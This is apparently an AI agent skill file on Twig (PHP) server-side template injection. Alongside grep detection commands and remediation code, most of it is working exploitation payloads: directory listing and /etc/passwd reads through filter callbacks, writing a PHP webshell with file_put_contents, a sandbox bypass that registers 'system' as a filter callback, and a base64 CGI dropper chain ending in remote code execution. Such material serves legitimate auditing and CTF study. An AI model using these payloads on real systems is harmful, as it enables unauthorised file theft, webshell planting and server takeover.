---
name: twig-patterns
description: Twig template engine (PHP) security patterns including SSTI via filter callbacks, sandbox bypass, and RCE without shell functions. Critical for Symfony, Drupal, and custom PHP applications.
---

# Twig Security Patterns

## 1. Server-Side Template Injection (SSTI)

**Vulnerable Pattern:** User input passed to `createTemplate()`, `loadTemplate()`, or string interpolation before template compilation.

### Detection

```bash
# Direct SSTI sinks
grep -rn "createTemplate\|->createTemplate(" --include="*.php"
grep -rn "loadTemplate\|->loadTemplate(" --include="*.php"

# String interpolation before render
grep -rn "render.*\\\$" --include="*.php"
grep -rn "twig.*render.*\\\$" --include="*.php"

# Environment access
grep -rn "getEnvironment\|->env" --include="*.php"
```

### Vulnerable Code Patterns

```php
// Direct SSTI - user input in template string
$message = $twig->createTemplate("Hello {$userInput}")->render();

// Variable interpolation before compile
$template = "Welcome {{ name }}, your role is {$role}";
$twig->createTemplate($template)->render();

// Dynamic template loading
$twig->loadTemplate($_GET['template']);
```

### Confirmation Payloads

```
# Basic math (confirms SSTI)
{{7*7}}                    → 49
{{7*'7'}}                  → 49

# Twig version disclosure
{{_self}}                  → Shows template info
{{_context|keys|join}}     → Lists available variables
{{app.environment}}        → Shows environment (dev/prod)

# PHP version
{{constant('PHP_VERSION')}}
```

---

## 2. Filter Callback Exploitation (CRITICAL)

**Vulnerable Pattern:** Twig's `sort`, `map`, `filter`, and `reduce` filters accept callback functions that invoke arbitrary PHP functions.

### How It Works

```
{{[arg1, arg2]|sort('php_function')}}
```

This calls `php_function(arg1, arg2)` because sort's comparator receives two arguments.

### Key Functions for Exploitation

| Filter | Arguments Passed | Use Case |
|--------|------------------|----------|
| `sort` | 2 args (a, b) | `file_put_contents`, `copy`, `rename` |
| `map` | 1 arg (item) | `scandir`, `file_get_contents`, `glob` |
| `filter` | 1 arg (item) | Boolean checks, `file_exists` |
| `reduce` | 2 args (carry, item) | Complex chains |

### Exploitation Payloads

```twig
# File system enumeration
{{['/']|map('scandir')|first|join(',')}}
{{['/www/*']|map('glob')|first|join(',')}}
{{['/www/public/index.php']|map('file_get_contents')|first}}

# Check environment
{{['PATH']|map('getenv')|first}}

# Write file (file_put_contents takes 2 args: filename, content)
{{['/www/public/shell.php','<?php system($_GET[c]);?>']|sort('file_put_contents')}}

# Copy file
{{['/www/public/index.php','/www/public/backup.php']|sort('copy')}}

# Check disable_functions via phpinfo
{{['phpinfo']|map('call_user_func')}}
```

### Bypass When Shell Functions Disabled

When `disable_functions` blocks common shell functions, use file-write primitives:

```twig
# Step 1: Write CGI script (base64 to avoid newline issues)
# First, create a PHP dropper
{{['/www/public/drop.php','<?php file_put_contents("/www/public/run.sh", base64_decode("IyEvYmluL3NoCmVjaG8gQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCmVjaG8KL3JlYWRmbGFn")); chmod("/www/public/run.sh", 0755);?>']|sort('file_put_contents')}}

# Step 2: Access dropper to create shell script
# GET /drop.php

# Step 3: Write .htaccess to enable CGI
{{['/www/public/.htaccess','Options +ExecCGI\nAddHandler cgi-script .sh']|sort('file_put_contents')}}

# Step 4: Execute CGI script
# GET /run.sh → executes /readflag
```

---

## 3. Sandbox Bypass (Twig 2.x/3.x)

**Vulnerable Pattern:** Even with Twig sandbox enabled, certain techniques can bypass restrictions.

### Detection

```bash
# Check for sandbox configuration
grep -rn "SandboxExtension\|SecurityPolicy" --include="*.php"
grep -rn "addExtension.*Sandbox" --include="*.php"
```

### Bypass Techniques

```twig
# Access _self.env (may bypass some sandbox configs)
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}

# Access via attribute function
{{attribute(_self, 'env')}}

# Arrow functions (Twig 3.x)
{{['id']|map(x => x)}}  # Confirms arrow functions work

# Reduce with callback
{{[0,1]|reduce((c,i) => c ~ i)}}
```

---

## 4. Object Instantiation

**Vulnerable Pattern:** Some Twig configurations allow object instantiation.

### Payloads

```twig
# Check for available classes
{{app}}
{{app.request}}
{{app.request.server.all|json_encode}}

# Symfony-specific (if Process component available)
# Note: Requires proper escaping and namespace access
```

---

## 5. Rarely Disabled PHP Functions

When auditing, check if these functions are available via SSTI:

| Function | Purpose | Exploitation |
|----------|---------|--------------|
| `file_put_contents` | Write files | Shell/config upload |
| `copy` | Copy files | Duplicate sensitive files |
| `rename` | Rename files | Move files strategically |
| `symlink` | Create symlinks | Link to sensitive files |
| `chmod` | Change permissions | Make files executable |
| `scandir` | List directories | Reconnaissance |
| `glob` | Pattern matching | Find files |
| `file_get_contents` | Read files | Exfiltrate data |

### Quick Check Payload

```twig
# Test multiple functions at once
Functions available:
- scandir: {{['/']|map('scandir')|first|length}}
- glob: {{['/www/*']|map('glob')|first|length}}
- file_get_contents: {{['/etc/passwd']|map('file_get_contents')|first|slice(0,10)}}
```

---

## 6. Common Misconfigurations

### Detection Commands

```bash
# Debug mode enabled
grep -rn "debug.*true\|APP_DEBUG.*1" --include="*.php" --include="*.env"

# Twig cache disabled (allows template modification)
grep -rn "cache.*false\|setCache.*false" --include="*.php"

# Auto-reload enabled (recompiles templates)
grep -rn "auto_reload.*true" --include="*.php"
```

---

## 7. Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    TWIG SSTI → RCE ATTACK CHAIN                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Step 1: Confirm SSTI                                                        │
│  └─> {{7*7}} → 49                                                           │
│                                                                              │
│  Step 2: Enumerate available functions                                       │
│  └─> {{['/']|map('scandir')|first|join}}                                    │
│                                                                              │
│  Step 3: Check for shell function access                                     │
│  └─> {{['id']|map('system')}} → if error, functions disabled                │
│                                                                              │
│  Step 4a: If shell functions available                                       │
│  └─> {{['id']|map('passthru')}} → RCE                                       │
│                                                                              │
│  Step 4b: If shell functions disabled (use file-write chain)                │
│  └─> Write PHP dropper via file_put_contents                                │
│  └─> Write .htaccess enabling CGI                                           │
│  └─> Write shell script                                                      │
│  └─> Access shell script via web → CGI execution → RCE                      │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 8. Remediation

```php
// BEFORE (VULNERABLE)
$message = $twig->createTemplate("Hello {$location}")->render();

// AFTER (SECURE) - Use parameterized templates
return $twig->render('greeting.html.twig', ['location' => $location]);

// Or escape in controller
$safeLocation = htmlspecialchars($location, ENT_QUOTES, 'UTF-8');
$message = "Hello " . $safeLocation;
```

### Sandbox Configuration

```php
use Twig\Extension\SandboxExtension;
use Twig\Sandbox\SecurityPolicy;

$policy = new SecurityPolicy(
    [],  // No allowed tags
    [],  // No allowed filters
    [],  // No allowed methods
    [],  // No allowed properties
    []   // No allowed functions
);
$twig->addExtension(new SandboxExtension($policy, true));
```
